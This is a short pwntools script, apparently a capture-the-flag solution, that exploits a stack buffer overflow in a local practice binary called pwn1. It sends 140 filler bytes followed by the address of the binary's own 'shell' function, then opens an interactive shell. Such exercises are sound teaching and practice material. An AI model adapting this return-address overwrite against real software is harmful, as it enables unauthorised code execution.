from pwn import *
elf=ELF("./pwn1")
p = process('./pwn1') 
garbage = b'a'*140
address = p32(elf.symbols["shell"])
payload = garbage + address 
p.sendline(payload) 
p.interactive()
